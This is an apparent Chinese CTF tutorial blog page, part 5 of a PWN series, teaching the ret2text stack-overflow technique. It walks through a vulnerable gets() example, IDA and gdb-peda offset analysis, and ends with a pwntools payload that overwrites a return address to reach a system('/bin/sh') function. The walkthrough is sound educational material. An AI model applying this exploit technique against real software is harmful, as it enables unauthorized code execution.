@@ -1,0 +1,298 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PWN从入门到放弃(5)——栈溢出之ret2text | 山深有杏&#39;s Blog</title>
+<link rel="shortcut icon" href="https://ssyxsec.com/favicon.ico?v=1735101861265">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ssyxsec.com/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PWN从入门到放弃(5)——栈溢出之ret2text | 山深有杏&#39;s Blog - Atom Feed" href="https://ssyxsec.com/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="0x00 栈溢出
+Buffer Overflow（缓冲区溢出）
+因为程序本身没有正确检查输入数据的大小，造成攻击者可以输入比buffer还要大的数据，使得超出部分覆盖程序的其他部分，影响程序执行。
+# include &lt;stdio.h..." />
+    <meta name="keywords" content="CTF,Pwn" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ssyxsec.com">
+  <img class="avatar" src="https://ssyxsec.com/images/avatar.png?v=1735101861265" alt="">
+  </a>
+  <h1 class="site-title">
+    山深有杏&#39;s Blog
+  </h1>
+  <p class="site-description">
+    These Violent Delights Have Violent Ends.
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://ssyxsec.com/0mQfqrf6-n" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PWN从入门到放弃(5)——栈溢出之ret2text
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-11-06
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://ssyxsec.com/tag/mFiLVoNunh/" class="post-tag">
+                  # CTF
+                </a>
+              
+                <a href="https://ssyxsec.com/tag/BcBYBpcwgI/" class="post-tag">
+                  # Pwn
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h3 id="0x00-栈溢出">0x00 栈溢出</h3>
+<h4 id="buffer-overflow缓冲区溢出">Buffer Overflow（缓冲区溢出）</h4>
+<p>因为程序本身没有正确检查输入数据的大小，造成攻击者可以输入比buffer还要大的数据，使得超出部分覆盖程序的其他部分，影响程序执行。</p>
+<pre><code class="language-javascript"># include &lt;stdio.h&gt;
+
+chr name[50];    //设置name变量，大小为50个字节
+
+int main(){
+    setvbuf(stdout,0,2,0);
+    printf(&quot;Name:&quot;);
+    read(0,name,50);      //读取50个字节到name
+    char buf[20];         //设置buf变量，大小为20个字节
+    printf(&quot;Try your best:&quot;);
+    gets(buf);            //读取用户输入到buf（不限长度）
+    return;
+}
+</code></pre>
+<p>从上面代码我们可以看出，read()函数限定了接收数据的字节数，并没有造成溢出，但是gets()函数没有限制接收数据的大小，若用户输入大于20个字节的数据，就会造成溢出。</p>
+<h4 id="stack-overflow栈溢出">Stack Overflow（栈溢出）</h4>
+<p>又称stack smashing，专指在stack上的Overflow，利用方式简单，可直接覆盖return address和控制参数，不管是什么漏洞，如果能找到stack overflow，之后就是标准动作了。</p>
+<h4 id="常见易溢出函数">常见易溢出函数</h4>
+<p>gets；scanf；strcpy；sprintf；memcpy；strcat……</p>
+<h3 id="0x01-ret2text">0x01 ret2text</h3>
+<p>Return to text，控制程序的返回地址到原本程序中的函数（代码）。</p>
+<p>例如程序中有类似function：</p>
+<ul>
+<li>system(‘/bin/sh’)</li>
+<li>execve(‘/bin/sh’,NULL,NULL)</li>
+</ul>
+<p>就可以跳转到这个function，function的地址可以通过objdump或者ida来查找。</p>
+<h3 id="0x02-例题">0x02 例题</h3>
+<h4 id="1查看文件信息">1）查看文件信息</h4>
+<p>先将题目拷贝到之前搭建好的pwn环境中，然后使用file和checksec命令查看题目信息。</p>
+<pre><code class="language-javascript">$ file ./ret2text
+$ checksec ./ret2text
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730943571594.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730943577502.png" alt="" loading="lazy"></figure>
+<h4 id="2查看程序大概流程">2）查看程序大概流程</h4>
+<p>运行一下程序，了解程序的大概流程</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730943586478.png" alt="" loading="lazy"></figure>
+<h4 id="3分析程序查找漏洞点">3）分析程序&amp;查找漏洞点</h4>
+<p>将程序扔到ida pro中分析</p>
+<figure data-type="image" tabindex="4"><img src="https://ssyxsec.com/post-images/1730943593343.png" alt="" loading="lazy"></figure>
+<p>看到左侧函数窗口中有vuln()函数，双击进入</p>
+<figure data-type="image" tabindex="5"><img src="https://ssyxsec.com/post-images/1730943600195.png" alt="" loading="lazy"></figure>
+<p>双击&amp;buf，查看buf大小</p>
+<figure data-type="image" tabindex="6"><img src="https://ssyxsec.com/post-images/1730943606079.png" alt="" loading="lazy"></figure>
+<p>我们看到buf的大小为1C+4，换算成10进制为32</p>
+<p>但是read()函数可以读入的大小为50，那么这里很明显存在栈溢出</p>
+<p>我们继续看左侧函数窗口，发现shell()函数，双击进入</p>
+<figure data-type="image" tabindex="7"><img src="https://ssyxsec.com/post-images/1730943611620.png" alt="" loading="lazy"></figure>
+<p>shell()函数中我们发现了 system(“/bin/sh”)</p>
+<p>也就是说我们调用shell()函数会给我们返回一个shell</p>
+<h4 id="4计算溢出偏移量">4）计算溢出偏移量</h4>
+<p>将程序导入gdb</p>
+<pre><code class="language-javascript">$ gdb ./ret2text
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://ssyxsec.com/post-images/1730943618788.png" alt="" loading="lazy"></figure>
+<p>输入r或者run，将程序运行起来</p>
+<p>当提示我们输入的时候，按ctrl+c将程序中断</p>
+<figure data-type="image" tabindex="9"><img src="https://ssyxsec.com/post-images/1730943625063.png" alt="" loading="lazy"></figure>
+<p>我们会看到这样一个界面，在终端输入</p>
+<pre><code class="language-javascript">gdb-peda$ pattern create 100
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://ssyxsec.com/post-images/1730943632902.png" alt="" loading="lazy"></figure>
+<p>工具会自动帮我们生成一个100长度的字符串</p>
+<p>我们将字符串复制，并输入c敲回车，继续运行程序</p>
+<figure data-type="image" tabindex="11"><img src="https://ssyxsec.com/post-images/1730943638764.png" alt="" loading="lazy"></figure>
+<p>将复制的字符串粘贴，并回车</p>
+<figure data-type="image" tabindex="12"><img src="https://ssyxsec.com/post-images/1730943647208.png" alt="" loading="lazy"></figure>
+<p>我们看到程序又被中断了，并且在DISASM窗口中提示Invalid address 0x41412941，程序的返回地址被我们的字符串覆盖了。</p>
+<p>第三篇我们讲过，EIP寄存器为指令寄存器，指向处理器下条等待执行的指令地址，正常情况当程序运行完当前函数EIP应该指向返回地址，并跳转到返回地址继续执行，我们看EIP寄存器的值为0x41412941，对应字符为“A)AA”，正是我们输入字符串中的字符。</p>
+<p>也就是说，我们找到“A)AA”在字符串中的位置，输入前面那些字符，并将“A)AA”替换成一个函数地址，那么当程序执行完当前函数，就会跳转到我们输入的函数地址继续执行。</p>
+<p>联想到我们之前找到的shell函数，我们将返回地址替换成shell函数的地址，那么程序执行完当前函数就会给我们返回一个shell。</p>
+<p>我们可以通过pattern工具直接算出“A)AA”在字符串中的位置</p>
+<pre><code class="language-javascript">gdb-peda$ pattern offset 0x41412941
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://ssyxsec.com/post-images/1730943654156.png" alt="" loading="lazy"></figure>
+<p>我们计算出偏移量为32。</p>
+<p>接下来我们就可以构造我们的payload了。</p>
+<h4 id="5构造payload">5）构造payload</h4>
+<pre><code class="language-javascript">from pwn import *
+
+r = process('./ret2text')
+
+padding = 32
+shell_addr = 0x0804851d
+
+payload = 'a' * padding
+payload += p32(shell_addr)
+
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#0x00-%E6%A0%88%E6%BA%A2%E5%87%BA">0x00 栈溢出</a>
+<ul>
+<li><a href="#buffer-overflow%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA">Buffer Overflow（缓冲区溢出）</a></li>
+<li><a href="#stack-overflow%E6%A0%88%E6%BA%A2%E5%87%BA">Stack Overflow（栈溢出）</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E6%98%93%E6%BA%A2%E5%87%BA%E5%87%BD%E6%95%B0">常见易溢出函数</a></li>
+</ul>
+</li>
+<li><a href="#0x01-ret2text">0x01 ret2text</a></li>
+<li><a href="#0x02-%E4%BE%8B%E9%A2%98">0x02 例题</a>
+<ul>
+<li><a href="#1%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF">1）查看文件信息</a></li>
+<li><a href="#2%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E5%A4%A7%E6%A6%82%E6%B5%81%E7%A8%8B">2）查看程序大概流程</a></li>
+<li><a href="#3%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E%E7%82%B9">3）分析程序&amp;查找漏洞点</a></li>
+<li><a href="#4%E8%AE%A1%E7%AE%97%E6%BA%A2%E5%87%BA%E5%81%8F%E7%A7%BB%E9%87%8F">4）计算溢出偏移量</a></li>
+<li><a href="#5%E6%9E%84%E9%80%A0payload">5）构造payload</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ssyxsec.com/jn9c-yxNeb/">
+              <h3 class="post-title">
+                PWN从入门到放弃(4)——程序保护机制
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ssyxsec.com/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
